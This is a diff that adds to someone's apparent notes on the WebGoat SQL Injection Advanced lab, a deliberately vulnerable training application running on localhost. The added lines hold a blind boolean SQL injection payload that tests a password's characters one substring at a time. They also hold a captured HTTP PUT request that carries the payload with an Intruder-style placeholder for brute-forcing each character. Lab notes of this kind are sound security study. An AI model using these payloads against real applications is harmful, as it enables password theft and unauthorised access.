@@ -308,3 +308,25 @@ username_reg=tom'+and+substring(password%2C1%2C1)%3D'§pass_char§&email_reg=bab
 
 ............................
 ............................ (ongoing, lol)
+
+tom' and substring(password,1,1)='t
+(replace character with pass_char)
+(replace substring attack character with the number you need)
+
+PUT /WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
+Host: localhost:6969
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:6969/WebGoat/start.mvc
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 134
+Connection: close
+Cookie: JSESSIONID=6e4llN6TosIn1Cq-iniIjK6gUMvNvTUUxqAgDo8v
+
+username_reg=tom'+and+substring(password%2C6%2C1)%3D'§pass_char§&email_reg=baber%40baber.net&password_reg=WHATEVER&confirm_password_reg=WHATEVER
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
